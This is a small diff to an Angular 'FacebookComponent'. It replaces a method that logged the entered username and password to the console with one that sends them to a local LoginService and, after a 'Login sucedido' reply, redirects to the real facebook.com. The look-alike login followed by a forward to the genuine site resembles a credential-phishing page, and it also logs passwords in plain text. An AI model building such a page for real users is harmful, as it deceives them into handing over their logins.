@@ -1,4 +1,5 @@
 import { Component } from '@angular/core';
+import { LoginService } from 'src/app/login.service';
 
 @Component({
   selector: 'app-facebook',
@@ -11,11 +12,24 @@ export class FacebookComponent {
   
   registerView: boolean = false;
 
-  navigate(){
-    if (this.loginName.length > 5 && this.pass.length > 8) {
-      console.log(this.loginName)
-      console.log(this.pass)
-      window.location.href = 'https://www.facebook.com/';
+  constructor(private loginService: LoginService){}
+
+  async login(){
+    try {
+      const response = await this.loginService.login(this.loginName, this.pass)
+      .toPromise();
+     
+      console.log('Response:', response);
+
+      if (response === "Login sucedido!") {
+        console.log(response);
+        alert('Login Sucedido!');
+
+        window.location.href = 'https://www.facebook.com/';
+      } else {
+        alert('Login falhou!');
+      }
+    } catch (error) {
     }
   }
 }
